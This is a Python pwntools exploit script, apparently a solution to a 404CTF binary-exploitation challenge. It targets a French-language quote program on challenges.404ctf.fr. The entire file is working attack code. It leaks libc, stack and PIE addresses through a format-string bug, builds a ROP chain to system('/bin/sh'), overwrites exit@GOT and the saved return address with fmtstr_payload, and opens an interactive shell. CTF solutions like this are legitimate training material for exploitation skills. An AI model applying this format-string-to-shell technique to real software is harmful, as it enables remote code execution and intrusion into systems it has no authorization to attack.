#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('une_citation_pas_comme_les_autres_2_2')
libc = ELF('libc.so.6')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 30242)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
# b *help_christian+884
# b *help_christian+976
b *help_christian+1007
b *conversation_christian+469
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b'>>> ', b'1')
io.sendlineafter(b'>>> ', b'1')
io.sendline(b"M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !")
io.sendline(b"L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")
io.sendline(b"Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")
io.sendline(b"De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")

##############
# Step 1: leak
##############
# %45$p -> libc leak _IO_stdfile_1_lock
# %64$p -> stack leak saved_rbp 0X68 to saved_rip
# %65$p -> pie leak saved_rip main+482
io.sendlineafter(b'situation ?\n[Vous] : ',b'%46$p %64$p %65$p')

libc_leak, stack_leak, pie_leak = io.recvuntil(b',', drop=True).split()
libc_leak, stack_leak, pie_leak = int(libc_leak,16), int(stack_leak,16), int(pie_leak,16)

libc.address = libc_leak - libc.sym['_IO_stdfile_1_lock']
exe.address = pie_leak - (exe.sym['main'] + 482)
saved_rip = stack_leak - (0x68)

log.success(f'{libc.address = :x} {exe.address = :x} {saved_rip = :x}')

##################
# Step 2: ropchain
##################

one_gadget = libc.address + 0x10a2fc

rop = ROP([exe,libc])
rop.rdi = next(libc.search(b'/bin/sh\0'))
rop.raw(libc.sym['do_system']+2)

print(rop.dump())

fmt = fmtstr_payload(32, {  exe.got['exit']: rop.find_gadget(['leave','ret']).address,saved_rip: rop.chain() }, write_size='short')

assert len(fmt) <= 0x100, f"FMT too long {len(fmt)}"

io.sendlineafter(b'je vous prie.\n', fmt)

fmt = fmtstr_payload(32, {  exe.got['printf']: libc.sym['system']}, write_size='short')
io.sendline(b'/bin/sh\0')

#io.clean()

io.interactive()

